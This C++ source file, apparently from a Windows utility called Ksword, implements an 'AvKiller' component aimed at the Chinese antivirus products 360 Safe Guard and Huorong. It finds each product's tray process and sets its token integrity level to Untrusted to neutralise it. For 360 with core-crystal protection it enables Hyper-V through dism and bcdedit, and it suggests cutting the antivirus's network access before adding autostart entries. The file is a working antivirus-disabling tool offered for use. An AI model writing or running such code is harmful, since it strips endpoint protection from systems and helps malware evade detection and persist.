#ifdef KSWORD_WITH_COMMAND
#include "../../KswordTotalHead.h"
#include <sddl.h>
using namespace std;
bool AvKillCore(DWORD pid) {

    // 3. 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        KMesErr("打开目标进程失败，错误代码" + to_string(GetLastError()));
        return 1;
    }

    // 4. 获取进程令牌
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_DEFAULT, &hToken)) {
        KMesErr("打开目标进程令牌失败，错误代码" + to_string(GetLastError()));
        CloseHandle(hProcess);
        return 1;
    }

    // 5. 创建Untrusted SID
    PSID untrustedSid = nullptr;
    if (!ConvertStringSidToSidA("S-1-16-0", &untrustedSid)) {
        KMesErr("低权限进程令牌创建失败，错误代码" + to_string(GetLastError()));
        CloseHandle(hToken);
        CloseHandle(hProcess);
        system("pause");
        return 1;
    }

    // 6. 准备令牌信息结构
    TOKEN_MANDATORY_LABEL tml = { 0 };
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    tml.Label.Sid = untrustedSid;

    // 7. 设置令牌完整性级别
    if (!SetTokenInformation(hToken, TokenIntegrityLevel, &tml, sizeof(tml) + GetLengthSid(untrustedSid))) {
        KMesErr("降权目标进程失败，错误代码" + to_string(GetLastError()));
        LocalFree(untrustedSid);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }
    KMesInfo("目标进程成功降权");

    // 8. 清理资源
    LocalFree(untrustedSid);
    CloseHandle(hToken);
    CloseHandle(hProcess);
}
int avkill() {
	KMesWarn("AvKiller内部组件v.1.0.0提供服务");
    KMesWarn("更新于2025/05/01");
    KMesWarn("CoffeeStudio合作开发");
    cout << "请输入目标杀软序号：" << endl <<
        "1>360安全卫士(无核晶)\t2>火绒安全" << endl <<
        "3>360安全卫士(有核晶)" << endl<<
		">";
	string userinput = Kgetline();
	if (userinput == "1" || userinput == "360") {
		int pid = GetPIDByIM("360tray.exe");
		if (pid == 0) {
			KMesErr("未检测到360核心模块360tray.exe");
		}
		else {
			KMesInfo("找到关键进程360tray.exe，进程pid为" + to_string(pid));
            AvKillCore(pid);
		}
	}
	else if(userinput=="2"||userinput=="hr"){
		int pid = GetPIDByIM("HipsTray.exe");
		if (pid == 0) {
			KMesErr("未检测到火绒核心模块HipsTray.exe");
		}
		else {
			KMesInfo("找到关键进程HipsTray，进程pid为" + to_string(pid));
            AvKillCore(pid);
		}
	}
    else if (userinput == "3") {
        RunCmdNow("dism /online /enable-feature /featurename:Microsoft-Hyper-V-All /all /norestart");
        RunCmdNow("bcdedit /set hypervisorlaunchtype auto");
        KMesWarn("需要重启操作系统。如果希望Ksword开机自启，可以尝试使用netmgr断网360后加自启动目录");
    }
	else {
		KMesErr("目标反病毒软件还未被纳入清单");
	}
	return 0;
}
#endif